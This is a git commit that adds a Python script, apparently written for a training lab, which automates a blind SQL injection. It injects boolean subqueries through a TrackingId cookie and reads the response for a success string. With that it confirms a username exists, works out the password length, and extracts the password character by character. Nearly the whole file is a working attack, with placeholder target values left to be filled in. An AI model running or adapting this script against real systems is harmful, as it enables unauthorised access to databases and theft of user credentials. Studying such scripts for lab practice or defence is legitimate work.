27d98e95785ec9bcf4740c2099801935788b908e
AwsGhanem <123994471+AwsGhanem@users.noreply.github.com>
2024-05-02 19:08:36 +0300

    Add files via upload

---
+++ BlindSQLinjection.py
@@ -0,0 +1,78 @@
+import requests
+
+total_queries = 0
+charset = "0123456789abcdefghijklmnopqrstuvwxyz"
+target = "Change-It"
+needle = "Welcome back!"
+
+# Function to perform injected query into a web application and return cookies
+def injected_query(payload):
+    global total_queries
+    cookies = {
+        "TrackingId": "Change-It' and {}-- ".format(payload),
+        "session": "Change-It"
+    }
+    data = {
+        "csrf": "Change-It",
+        "username": "admin",
+        "password": "admin"
+    }
+    r = requests.post(target, cookies=cookies, data=data)
+    total_queries += 1
+    return needle.encode() in r.content
+
+# check if the username exists
+def invalid_user(username):
+    payload = "(select 'a' from users where username = '{}')='a'".format(username)
+    return injected_query(payload)
+
+# identify the length of the password
+def password_length(username):
+    i = 0
+    flag = True
+    while flag:
+        payload = "(select 'a' from users where username = '{}' and length(password) <= {})='a'".format(username, i)
+        if not injected_query(payload):
+            i += 1
+        else:
+            flag = False
+    return i
+
+# Extracting the hash
+def extract_hash(username,length):
+    found=""
+    for i in range(length+1):
+        for char in charset:
+            payload = "(select substring(password,{},1) from users where username='{}')='{}'".format(i,username,char)
+            if injected_query(payload):
+                found+=char
+            else:
+                continue    
+    return found            
+
+
+# Function to display total queries made
+def total_queries_taken():
+    global total_queries
+    print("[i] {} total queries!".format(total_queries))
+    total_queries = 0
+
+# Main loop
+while True:
+    try:
+        username = input("> Enter the Username: ")
+        print(invalid_user(username))
+        if invalid_user(username):
+            user_password_length = password_length(username)
+            print("[-] user {} hash length: {}".format(username, user_password_length))
+            extractHash=input("Do you want to extract the hash?")
+            if extractHash=="yes":
+                print("Hash value: ",extract_hash(username,user_password_length))
+
+            total_queries_taken()
+        else:
+            print("[X] user {} does not exist!".format(username))
+
+
+    except KeyboardInterrupt:
+        break
